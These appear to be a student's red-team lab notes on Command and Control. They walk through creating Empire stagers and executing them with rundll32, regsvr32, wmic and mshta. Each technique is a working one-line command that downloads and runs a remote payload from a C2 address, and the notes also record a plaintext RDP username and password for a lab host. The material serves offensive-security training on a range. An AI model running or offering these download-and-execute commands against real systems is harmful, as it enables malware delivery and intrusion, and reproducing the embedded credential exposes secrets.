#### Tags: [[12 - Command and Control (TA0011)]]

## Objectives

    Create different payloads for familiarity
    Test payloads from the range
    Use additional tools to enhance payloads
## Overview
This lab will focus on creating multiple payloads and then testing them in the student range. We will use various methods to gain familiarity with different techniques.

### Launch [[Empire C2#Create an Empire listener]] 

## [[PowerShell Stager with rundll32.exe]]

#### *Payload:* Create Powershell Stager

![[Pasted image 20240317180009.png]]

#### *Execution Technique:* 
```markdown
# Executing Stager with rundll32.exe
rundll32.exe javascript:"\..\mshtml,RunHTMLApplication ";document.write();new%20ActiveXObject("WScript.Shell").Run("powershell -nop -exec bypass -c IEX (New-Object Net.WebClient).DownloadString('http://10.254.252.3:8000/setup.ps1');")
```

----
## [[SCT stager and execute with regsvr32.exe]]

#### *Payload:* Create a SCT stager
`xfreerdp +clipboard /cert-ignore /u:Gareth.Kilgallen /p:Hu825meapvsAq#Rx /v:wk01.draconem.corp`

![[Pasted image 20240317175954.png]]
#### *Execution Technique:* 
```markdown
# Executing Stager with regsvr32.exe
regsvr32 /s /n /u /i:http://10.254.252.3:8000/config.sct scrobj.dll
```

---
## [[WMIC stager and execute with wmic]]

#### *Payload:* Create WMIC Stager

![[Pasted image 20240317175936.png]]

#### *Execution Technique:* 
```markdown
# Executing Stager with wmic
wget http://10.254.252.2:8000/update.xsl -o update.xsl
wmic os get /format:"update.xsl"
```

---

## [[HTA stager and execute with mshta.exe]]

#### *Payload:* Create HTA Stager

![[Pasted image 20240317175917.png]]
#### *Execution Technique:* 
```markdown
# Executing Stager with mshta.exe
mshta.exe http://10.254.252.3:8000/app.hta
```

----
### Executing Techniques

Link to Heading
and create 2 - Payloads & Execution Tech 

#### Notes | Bonus
- Create Links
- Bonus RT Sections 
	- Learn to deploy payload without RDP 
	- Learn to leverage Cobalt strike for payload creation

## Conclusion

